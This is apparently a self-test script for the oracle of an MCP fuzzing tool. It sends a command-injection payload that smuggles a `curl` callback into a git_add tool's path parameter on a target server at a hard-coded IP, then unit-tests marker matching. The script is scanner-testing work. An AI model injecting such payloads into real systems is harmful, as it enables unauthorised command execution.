"""判定器自测（临时脚手架，非检测逻辑；手写载荷仅用于验证判定器管路）。

- OOB：真实端到端——对 git 靶机(例子)发一条命令注入载荷，判定器应查到回连并判"确认"。
- 回显：单元验证——给 observe_response 喂含/不含 marker 的文本，验证匹配逻辑。
"""
from mcpfuzz.driver import call_tool_sync
from mcpfuzz.oracle import CONFIRMED, NOT_TRIGGERED, Oracle

GIT = "http://43.133.80.249:20001/mcp"   # 测试用例（例子），不进入任何检测逻辑

oracle = Oracle()

print("===== OOB 通道：真实端到端 =====")
p = oracle.new_probe("oob", meta={"tool": "git_add", "param": "path"})
payload = f'x" ; curl -s {p.embed} ; echo "'      # 手写脚手架
p.meta["payload"] = payload
print("探针 token:", p.token, "| 回连:", p.embed)
resp = call_tool_sync(GIT, "git_add", {"path": payload, "files": "."})
print("工具返回:", (resp["text"] or "")[:100].replace("\n", " "))
hits = oracle.poll([p])
f = oracle.verdict(p, hits.get(p.token))
print("判定:", f.status, "| 证据:", f.evidence)
print("复现:", f.repro)
assert f.status == CONFIRMED, "OOB 端到端未确认"

print("\n===== 回显通道：单元验证 =====")
p2 = oracle.new_probe("reflection", meta={"tool": "x", "param": "y"})
hit_yes = oracle.observe_response(p2, f"some output {p2.embed} trailing")
hit_no = oracle.observe_response(p2, "nothing relevant here")
print("含 marker  ->", oracle.verdict(p2, hit_yes).status, "| 片段:", (hit_yes.evidence if hit_yes else None))
print("不含 marker ->", oracle.verdict(p2, hit_no).status)
assert oracle.verdict(p2, hit_yes).status == CONFIRMED
assert oracle.verdict(p2, hit_no).status == NOT_TRIGGERED

print("\n全部通过 ✅")
